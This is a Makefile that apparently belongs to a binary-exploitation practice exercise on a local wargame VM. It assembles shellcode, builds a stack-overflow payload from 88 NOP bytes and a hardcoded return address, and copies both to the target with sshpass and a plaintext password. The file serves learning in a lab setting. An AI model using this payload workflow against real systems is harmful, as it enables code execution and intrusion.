ASM          = payload.asm
OBJ          = shellcode.o
ELF          = shellcode
BIN          = shellcode.bin
PAYLOAD      = payload.bin

RET_ADDR     = 00007fffffffe62c
NOP_COUNT    = 88

HOST         = localhost
PORT         = 4242
USER         = level00
PASS         = level00
REMOTE_DIR   = /home/level00

SSH_OPTS     = -p $(PORT)
SCP_OPTS     = -P $(PORT)
SSH          = sshpass -p $(PASS) ssh $(SSH_OPTS) $(USER)@$(HOST)
SCP          = sshpass -p $(PASS) scp $(SCP_OPTS)

SHELL := /bin/bash

all: copy-bin copy-payload

$(ELF): $(ASM)
	nasm -f elf64 $(ASM) -o $(OBJ)
	ld -m elf_x86_64 $(OBJ) -o $(ELF)
	rm -f $(OBJ)

$(BIN): $(ELF)
	objcopy -O binary -j .text $(ELF) $(BIN)

# push shellcode.bin to the VM
copy-bin: $(BIN) export-env
	$(SCP) $(BIN) $(USER)@$(HOST):$(REMOTE_DIR)/$(BIN)

# env var must be set in the SAME interactive shell that runs c4se/the exploit,
# so this just prints the command to run manually on the VM
export-env:
	@echo 'Run on the VM, in the session you will use to get the address:'
	@echo '  export SHELLCODE=$$(cat $(REMOTE_DIR)/$(BIN))'

$(PAYLOAD):
	{ \
		printf '90%.0s' $$(seq 1 $(NOP_COUNT)); \
		echo $(RET_ADDR) | fold -w2 | tac | tr -d '\n'; \
	} | xxd -r -p > $(PAYLOAD)
	xxd $(PAYLOAD)

copy-payload: $(PAYLOAD)
	$(SCP) $(PAYLOAD) $(USER)@$(HOST):$(REMOTE_DIR)/payload.bin

clean:
	rm -f $(OBJ) $(ELF) $(BIN) $(PAYLOAD)

re: clean all

.PHONY: all clean re copy-bin export-env copy-payload